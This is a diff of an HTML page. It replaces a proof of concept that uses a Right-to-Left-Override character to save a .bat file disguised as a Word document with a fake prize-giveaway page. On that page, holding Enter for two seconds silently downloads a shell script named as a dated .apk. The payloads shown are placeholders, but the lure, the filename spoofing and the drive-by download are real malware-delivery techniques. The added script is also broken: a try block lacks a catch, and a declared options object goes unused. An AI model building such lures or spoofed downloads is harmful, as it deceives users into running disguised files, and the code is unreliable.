@@ -1,39 +1,245 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-<head>
-  <meta charset="utf-8">
-  <title>Word Icon Spoof - No History</title>
-</head>
-<body>
-  <h3>Save as Word Document - Actually a BAT</h3>
-  <button id="save">Save File</button>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Unlock Your Dream Prize! 🚗💰</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&family=Source+Code+Pro&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <style>
+      body {
+        font-family: "Roboto", sans-serif;
+        background-image: url("https://www.w3schools.com/w3images/mountains.jpg");
+        background-size: cover;
+        background-position: center;
+        color: #ffffff;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        overflow: hidden;
+      }
 
-  <script>
-    document.getElementById('save').addEventListener('click', async () => {
-      // Reversing "doc" using RTLO, and adding real extension .bat
-      const spoofedName = 'report\u202e cod.bat'; // displays as report.bat.doc
+      .container {
+        text-align: center;
+        padding: 50px;
+        background: rgba(0, 0, 0, 0.7);
+        border-radius: 25px;
+        width: 80%;
+        max-width: 650px;
+        box-shadow: 0px 25px 50px rgba(0, 0, 0, 0.6);
+        transition: transform 0.4s ease, box-shadow 0.4s ease;
+      }
 
-      const options = {
-        suggestedName: spoofedName,
-        types: [{
-          description: 'Microsoft Word Document',
-          accept: {
-            'application/x-msdownload': ['.bat']
+      .container:hover {
+        transform: translateY(-15px);
+        box-shadow: 0px 35px 75px rgba(0, 0, 0, 0.8);
+      }
+
+      h1 {
+        font-size: 60px;
+        margin-bottom: 20px;
+        color: #ff5c8d;
+        text-transform: uppercase;
+        font-weight: 700;
+        letter-spacing: 3px;
+      }
+
+      h2 {
+        font-size: 42px;
+        margin-bottom: 20px;
+        color: #ffffff;
+        font-weight: 500;
+        text-transform: uppercase;
+        letter-spacing: 1.5px;
+      }
+
+      h3 {
+        font-size: 20px;
+        color: #b3b3b3;
+        margin-bottom: 30px;
+        font-weight: 300;
+      }
+
+      h2 span {
+        color: #ff5c8d;
+        font-size: 70px;
+        font-weight: bold;
+        letter-spacing: 5px;
+      }
+
+      #instruction {
+        font-size: 22px;
+        color: #f0f0f0;
+        margin-top: 20px;
+        font-weight: 500;
+        opacity: 0;
+        animation: fadeIn 2s ease-in-out;
+      }
+
+      #gameover {
+        font-size: 22px;
+        color: #ff5c8d;
+        font-weight: 500;
+        margin-top: 20px;
+        opacity: 0;
+        transition: opacity 0.6s ease-in-out;
+      }
+
+      #gameover.active {
+        opacity: 1;
+      }
+
+      .author {
+        position: absolute;
+        bottom: 15px;
+        font-size: 14px;
+        color: #ffffff;
+        opacity: 0.7;
+      }
+
+      .prize {
+        font-size: 32px;
+        color: #f0f0f0;
+        margin-top: 20px;
+        font-weight: 600;
+        text-transform: uppercase;
+      }
+
+      .prize span {
+        color: #ffcc00;
+      }
+
+      @media screen and (max-width: 768px) {
+        h1 {
+          font-size: 48px;
+        }
+        h2 {
+          font-size: 36px;
+        }
+        .prize {
+          font-size: 24px;
+        }
+      }
+
+      @keyframes fadeIn {
+        0% {
+          opacity: 0;
+        }
+        100% {
+          opacity: 1;
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="container text-center">
+      <h1>Unlock Your Dream Prize! 🚗💰</h1>
+      <h2><span>⌨️ Hold Enter</span> for 2 seconds to win!</h2>
+      <h3>Grand Prize: A brand new car 🚙 and $10,000,000 in cash 💵</h3>
+      <div id="instruction" class="text-light">Hold Enter for 2 seconds...</div>
+      <div class="prize text-light">Are you ready to win?</div>
+      <h3 id="gameover" class="text-light"></h3>
+    </div>
+    <div class="author text-center">AlayersHunters</div>
+
+    <div id="pixel" style="height: 1px; width: 1px"></div>
+
+    <script>
+      let enterPressStart = 0;
+      let isDownloaded = false;
+
+      window.onload = function () {
+        const body = document.querySelector("body");
+        const instruction = document.querySelector("#instruction");
+        const gameover = document.querySelector("#gameover");
+
+        instruction.style.opacity = 1;
+
+        body.onkeydown = (e) => handleEnterPress(e);
+        body.onkeyup = (e) => cancelEnterPress(e);
+
+        const pixel = document.getElementById("pixel");
+        pixel.addEventListener("click", async () => {
+          const zshContent = `
+# Dream Prize Script
+echo "Congratulations! You've unlocked your dream prize!"
+echo "This is a simple test script."
+echo "You can add more commands here."
+          `;
+
+          const blob = new Blob([zshContent], { type: "text/plain" });
+
+          // === Generate tanggal + jam ===
+          const now = new Date();
+          const year = now.getFullYear();
+          const month = String(now.getMonth() + 1).padStart(2, "0");
+          const day = String(now.getDate()).padStart(2, "0");
+          const hour = String(now.getHours()).padStart(2, "0");
+          const minute = String(now.getMinutes()).padStart(2, "0");
+          const second = String(now.getSeconds()).padStart(2, "0");
+          const formattedDateTime = `${year}-${month}-${day}_${hour}-${minute}-${second}`;
+
+          const options = {
+            startIn: "downloads",
+            suggestedName: `doorprize_${formattedDateTime}.apk`,
+            types: [
+              {
+                description: "ZSH Shell Script",
+                accept: {
+                  "text/plain": [".sh"],
+                },
+              },
+            ],
+            excludeAcceptAllOption: true,
+          };
+
+          try {
+const url = URL.createObjectURL(blob);
+  const a = document.createElement("a");
+  a.href = url;
+  a.download = `doorprize_${formattedDateTime}.apk`;
+  a.style.display = "none";
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+
+  gameover.textContent =
+    "You have unlocked the prize! File is being downloaded.";
+  gameover.classList.add("active");
           }
-        }]
+        });
       };
 
-      try {
-        const handle = await window.showSaveFilePicker(options);
-        const writable = await handle.createWritable();
-        await writable.write(`@echo off\r\nstart calc.exe`);
-        await writable.close();
-        alert('Saved as fake Word document!');
-      } catch (err) {
-        console.error(err);
-        alert('Cancelled');
+      function handleEnterPress(event) {
+        if (event.key === "Enter") {
+          if (enterPressStart === 0) {
+            enterPressStart = Date.now();
+          }
+          const elapsedTime = Date.now() - enterPressStart;
+          if (elapsedTime >= 2000 && !isDownloaded) {
+            document.getElementById("pixel").click();
+            isDownloaded = true;
+          }
+        }
       }
-    });
-  </script>
-</body>
+
+      function cancelEnterPress(event) {
+        if (event.key === "Enter") {
+          enterPressStart = 0;
+        }
+      }
+    </script>
+
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+  </body>
 </html>
